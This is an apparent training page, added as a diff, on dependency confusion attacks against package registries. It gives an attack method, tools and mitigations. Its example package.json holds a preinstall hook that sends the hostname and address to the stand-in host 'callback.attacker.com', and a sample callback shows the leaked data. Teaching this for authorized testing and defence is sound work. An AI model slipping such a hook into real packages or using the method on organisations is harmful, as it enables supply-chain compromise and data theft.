@@ -1,0 +1,92 @@
+---
+layout: training-page
+title: "Dependency Confusion — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - dependency-confusion
+  - supply-chain
+  - npm
+  - pypi
+  - package-managers
+page_key: "web-dependency-confusion"
+---
+<h1>Dependency Confusion</h1>
+<p>A dependency confusion attack (also called a supply chain substitution attack) tricks a package installer into pulling a malicious package from a public registry instead of the intended internal package with the same name. When a company uses private packages, an attacker who registers a public package with the same name — and a higher version number — may cause automated build systems to fetch the malicious package instead.</p>
+
+<h2>Tools</h2>
+<ul>
+  <li><strong>confused</strong> — Checks for dependency confusion vulnerabilities across npm, pip, gem, and other package managers — <code>github.com/visma-prodsec/confused</code></li>
+  <li><strong>DepFuzzer</strong> — Finds dependency confusion or projects where owner's email can be taken over — <code>github.com/synacktiv/DepFuzzer</code></li>
+</ul>
+
+<h2>How It Works</h2>
+<p>Package managers like npm, pip, gem, and Maven resolve dependencies by searching both internal (private) and external (public) registries. When the public registry returns a package with a higher version number than the internal one, many package managers prefer the public version by default.</p>
+
+<p>Affected ecosystems:</p>
+<ul>
+  <li><strong>JavaScript / Node.js</strong> (npm) — <code>package.json</code></li>
+  <li><strong>Python</strong> (PyPI) — <code>requirements.txt</code>, <code>setup.py</code>, <code>pyproject.toml</code></li>
+  <li><strong>PHP</strong> (Composer) — <code>composer.json</code></li>
+  <li><strong>Java</strong> (Maven) — <code>pom.xml</code></li>
+  <li><strong>Docker</strong> — <code>Dockerfile</code> image references</li>
+</ul>
+
+<h2>Attack Methodology</h2>
+
+<h3>Step 1 — Enumerate Internal Package Names</h3>
+<p>Find private package names used by the target organization. Common sources:</p>
+<ul>
+  <li>Public GitHub repositories — look at <code>package.json</code>, <code>requirements.txt</code>, <code>composer.json</code>, <code>pom.xml</code></li>
+  <li>Job postings that mention internal tooling</li>
+  <li>JavaScript bundles in the application that reference internal module names</li>
+  <li>npm <code>package-lock.json</code> or <code>yarn.lock</code> files that list resolved registry URLs</li>
+  <li>Error pages or stack traces that leak package paths</li>
+</ul>
+
+<h3>Step 2 — Check if the Package Name is Unclaimed on Public Registries</h3>
+<p>Search <a href="https://www.npmjs.com">npmjs.com</a>, PyPI, RubyGems, or other relevant public registries for the internal package name. If it is not registered, the attack surface exists.</p>
+
+<h3>Step 3 — Register the Public Package with a Higher Version</h3>
+<p>Create a public package with:</p>
+<ul>
+  <li>The same name as the internal private package</li>
+  <li>A version number higher than the internal version (e.g., <code>9999.0.0</code>)</li>
+  <li>A payload in <code>install</code> scripts or the package code itself that exfiltrates data (DNS callback with hostname, username, etc.)</li>
+</ul>
+<p>Example npm package payload skeleton (for authorized bug bounty testing only):</p>
+<pre><code># package.json
+{
+  "name": "internal-package-name",
+  "version": "9999.0.0",
+  "description": "Dependency confusion PoC",
+  "scripts": {
+    "preinstall": "node -e \"require('dns').lookup(require('os').hostname(),function(e,a){require('http').get('http://callback.attacker.com/?d='+a+'&amp;h='+require('os').hostname())})\""
+  }
+}</code></pre>
+
+<h3>Step 4 — Wait for Execution</h3>
+<p>When a developer or CI/CD pipeline installs dependencies, the package manager may pull the malicious public package instead of the internal one. The <code>preinstall</code> script executes automatically during installation, sending a callback to the attacker's server.</p>
+
+<h2>Detection Signals</h2>
+<p>In bug bounty context, the callback will include identifying information about the victim environment:</p>
+<pre><code># Typical callback received by attacker
+GET /?d=10.10.20.5&amp;h=build-server-prod-01 HTTP/1.1
+Host: callback.attacker.com</code></pre>
+
+<h2>Mitigations</h2>
+<ul>
+  <li>Use a private package registry (Artifactory, GitHub Packages, Azure Artifacts) configured as the sole source — do not fall back to public registries</li>
+  <li>Pin exact package versions and use lock files (<code>package-lock.json</code>, <code>Pipfile.lock</code>)</li>
+  <li>Use scoped packages in npm (<code>@company/package-name</code>) — scoped packages are harder to squatter</li>
+  <li>Register your internal package names on public registries as placeholders (with no real code)</li>
+  <li>Use tools like <code>confused</code> to audit your dependency manifests</li>
+</ul>
+
+<h2>Resources</h2>
+<ul>
+  <li>confused — <code>github.com/visma-prodsec/confused</code></li>
+  <li>DepFuzzer — <code>github.com/synacktiv/DepFuzzer</code></li>
+  <li>Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies — Alex Birsan</li>
+  <li>Exploiting Dependency Confusion — Aman Sapra (0xsapra)</li>
+  <li>3 Ways to Mitigate Risk When Using Private Package Feeds — Microsoft Azure</li>
+</ul>
